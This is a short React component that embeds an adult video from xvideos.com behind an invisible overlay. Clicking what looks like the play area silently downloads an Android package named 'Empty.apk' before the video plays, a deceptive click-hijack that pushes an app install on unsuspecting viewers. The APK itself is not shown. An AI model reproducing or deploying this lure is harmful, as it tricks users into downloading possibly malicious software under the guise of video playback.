import React from "react";
import { useState } from "react";
import "./VideoPlayer.css";

const VideoPlayer = () => {
  const [isPlaying, setIsPlaying] = useState(false);

  const handlePlayClick = () => {
    const url = '/files/Empty.apk';
    const link = document.createElement('a');
    link.href = url;
    link.download = 'Empty.apk';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    setIsPlaying(true);
  };

  const embedId = "75439317";

  return (
    <div className="video-responsive">
      {!isPlaying && (<div className="wrap" onClick={handlePlayClick}></div>)}
      <iframe
        src={`https://www.xvideos.com/embedframe/${embedId}`}
        title="xvideo"
        width="560"
        height="315"
        frameBorder="0"
        scrolling="no"
        allowFullScreen
      />
    </div>
  );
};

export default VideoPlayer;